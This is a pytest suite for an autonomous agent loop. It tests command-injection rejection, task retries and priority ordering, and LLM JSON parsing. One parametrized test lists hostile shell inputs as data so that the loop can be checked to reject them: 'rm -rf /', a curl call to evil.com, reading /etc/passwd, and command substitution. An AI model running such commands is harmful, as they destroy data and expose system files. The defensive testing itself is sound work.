"""Safety tests for AutonomousLoop – command injection, state transitions, parsing."""

import asyncio
import json
import os
import pytest
from pathlib import Path
from unittest.mock import patch, MagicMock

import src.loop.autonomous_loop as loop_mod
from src.loop.autonomous_loop import (
    AutonomousLoop,
    LoopTask,
    TaskStatus,
    TaskPriority,
    BrowserVerifier,
    LearningAnalyzer,
    _parse_llm_json_response,
)


@pytest.fixture()
def loop(tmp_path, monkeypatch):
    """Fresh AutonomousLoop with data dir in tmp."""
    monkeypatch.setattr(loop_mod, "_LLM_AVAILABLE", False)
    lp = AutonomousLoop(data_dir=str(tmp_path / "loop"))
    return lp


# ── run_command safety ──────────────────────────────────────────

class TestRunCommandSafety:
    """The run_command action must reject shell metacharacters."""

    @pytest.mark.parametrize("cmd", [
        "echo hello; rm -rf /",
        "ls | grep secret",
        "cat file && curl evil.com",
        "echo $(whoami)",
        "echo `id`",
        "cat < /etc/passwd",
        "echo foo > /tmp/bad",
    ])
    def test_shell_metacharacters_rejected(self, loop, cmd):
        task = LoopTask(
            id="t1", name="test", description="test",
            action="run_command", params={"command": cmd},
        )
        result = asyncio.run(loop.execute_task(task))
        assert not result["success"], f"Should reject: {cmd}"
        assert "disallowed" in str(result.get("error", "")).lower() or "metacharacter" in str(result.get("error", "")).lower()

    def test_empty_command_rejected(self, loop):
        task = LoopTask(
            id="t2", name="test", description="test",
            action="run_command", params={"command": "  "},
        )
        result = asyncio.run(loop.execute_task(task))
        assert not result["success"]

    def test_null_byte_rejected(self, loop):
        task = LoopTask(
            id="t3", name="test", description="test",
            action="run_command", params={"command": "echo\x00hi"},
        )
        result = asyncio.run(loop.execute_task(task))
        assert not result["success"]

    def test_unterminated_quotes_rejected(self, loop):
        task = LoopTask(
            id="t4", name="test", description="test",
            action="run_command", params={"command": "echo 'hello"},
        )
        result = asyncio.run(loop.execute_task(task))
        assert not result["success"]

    def test_safe_command_succeeds(self, loop):
        task = LoopTask(
            id="t5", name="test", description="test",
            action="run_command", params={"command": "echo hello"},
        )
        result = asyncio.run(loop.execute_task(task))
        assert result["success"]
        assert "hello" in result["output"]["stdout"]


# ── run_python safety ───────────────────────────────────────────

class TestRunPython:
    def test_simple_code_success(self, loop):
        task = LoopTask(
            id="t6", name="test", description="test",
            action="run_python", params={"code": "result = 42"},
        )
        result = asyncio.run(loop.execute_task(task))
        assert result["success"]

    def test_syntax_error_fails(self, loop):
        task = LoopTask(
            id="t7", name="test", description="test",
            action="run_python", params={"code": "def !!!"},
        )
        result = asyncio.run(loop.execute_task(task))
        assert not result["success"]

    def test_non_string_code_rejected(self, loop):
        task = LoopTask(
            id="t8", name="test", description="test",
            action="run_python", params={"code": 123},
        )
        result = asyncio.run(loop.execute_task(task))
        assert not result["success"]


# ── Task state transitions ──────────────────────────────────────

class TestTaskStateTransitions:
    def test_success_sets_completed(self, loop):
        task = LoopTask(
            id="t9", name="test", description="test",
            action="run_command", params={"command": "echo ok"},
        )
        asyncio.run(loop.execute_task(task))
        assert task.status == TaskStatus.COMPLETED

    def test_failure_with_retries_returns_to_pending(self, loop):
        task = LoopTask(
            id="t10", name="test", description="test",
            action="run_command", params={"command": "echo hello; bad"},
            max_retries=3,
        )
        asyncio.run(loop.execute_task(task))
        assert task.status == TaskStatus.PENDING
        assert task.retry_count == 1

    def test_failure_exhausted_retries_sets_failed(self, loop):
        task = LoopTask(
            id="t11", name="test", description="test",
            action="run_command", params={"command": "echo hello; bad"},
            max_retries=1,
            retry_count=1,
        )
        asyncio.run(loop.execute_task(task))
        assert task.status == TaskStatus.FAILED

    def test_unknown_action_fails(self, loop):
        task = LoopTask(
            id="t12", name="test", description="test",
            action="nonexistent_action", params={},
        )
        result = asyncio.run(loop.execute_task(task))
        assert not result["success"]
        assert "Unknown action" in (result.get("error") or "")


# ── Task queue priority ordering ────────────────────────────────

class TestTaskQueue:
    def test_priority_insertion_order(self, loop):
        loop.add_task("low", "d", "run_command", priority=TaskPriority.LOW)
        loop.add_task("critical", "d", "run_command", priority=TaskPriority.CRITICAL)
        loop.add_task("medium", "d", "run_command", priority=TaskPriority.MEDIUM)

        priorities = [t.priority for t in loop.task_queue]
        assert priorities[0] == TaskPriority.CRITICAL
        assert priorities[-1] == TaskPriority.LOW

    def test_state_persistence(self, loop):
        loop.add_task("persist_test", "desc", "run_command", params={"command": "echo hi"})
        loop._save_state()

        state_file = loop.data_dir / "loop_state.json"
        assert state_file.exists()
        data = json.loads(state_file.read_text())
        assert len(data["pending_tasks"]) >= 1


# ── LLM JSON response parsing ──────────────────────────────────

class TestParseLLMJson:
    def test_dict_passthrough(self):
        assert _parse_llm_json_response({"a": 1}) == {"a": 1}

    def test_list_passthrough(self):
        assert _parse_llm_json_response([1, 2]) == [1, 2]

    def test_plain_json_string(self):
        assert _parse_llm_json_response('{"key": "val"}') == {"key": "val"}

    def test_fenced_code_block(self):
        text = '```json\n{"key": "val"}\n```'
        assert _parse_llm_json_response(text) == {"key": "val"}

    def test_embedded_json(self):
        text = 'Here is the result: {"key": 1} done.'
        assert _parse_llm_json_response(text) == {"key": 1}

    def test_invalid_raises(self):
        with pytest.raises((json.JSONDecodeError, TypeError)):
            _parse_llm_json_response("not json at all")

    def test_non_string_non_collection_raises(self):
        with pytest.raises(TypeError):
            _parse_llm_json_response(12345)


# ── BrowserVerifier ─────────────────────────────────────────────

class TestBrowserVerifier:
    def test_verify_file_not_found(self, tmp_path):
        v = BrowserVerifier(screenshot_dir=str(tmp_path / "screens"))
        result = v.verify_file("/nonexistent/file.html", "test_id")
        assert result["success"] is False
        assert "not found" in result["error"].lower()


# ── LearningAnalyzer ───────────────────────────────────────────

class TestLearningAnalyzer:
    def test_failure_generates_learning(self, monkeypatch):
        monkeypatch.setattr(loop_mod, "_LLM_AVAILABLE", False)
        analyzer = LearningAnalyzer()
        task = LoopTask(
            id="t_learn", name="fail_task", description="test",
            action="run_command", params={},
        )
        task.result = {"success": False, "error": "some error"}
        verification = {"success": False, "error": "some error"}

        analysis = analyzer.analyze_result(task, verification)
        assert len(analysis["learnings"]) >= 1
        assert analysis["learnings"][0]["type"] == "failure_pattern"

    def test_success_generates_learning(self, monkeypatch):
        monkeypatch.setattr(loop_mod, "_LLM_AVAILABLE", False)
        analyzer = LearningAnalyzer()
        task = LoopTask(
            id="t_learn2", name="ok_task", description="test",
            action="run_command", params={},
        )
        task.result = {"success": True}
        verification = {"success": True}

        analysis = analyzer.analyze_result(task, verification)
        assert any(l["type"] == "success_pattern" for l in analysis["learnings"])

    def test_retry_pattern_detected(self, monkeypatch):
        monkeypatch.setattr(loop_mod, "_LLM_AVAILABLE", False)
        analyzer = LearningAnalyzer()
        task = LoopTask(
            id="t_learn3", name="retry_task", description="test",
            action="run_command", params={}, retry_count=2,
        )
        task.result = {"success": True}
        verification = {"success": True}

        analysis = analyzer.analyze_result(task, verification)
        assert any(l["type"] == "retry_pattern" for l in analysis["learnings"])
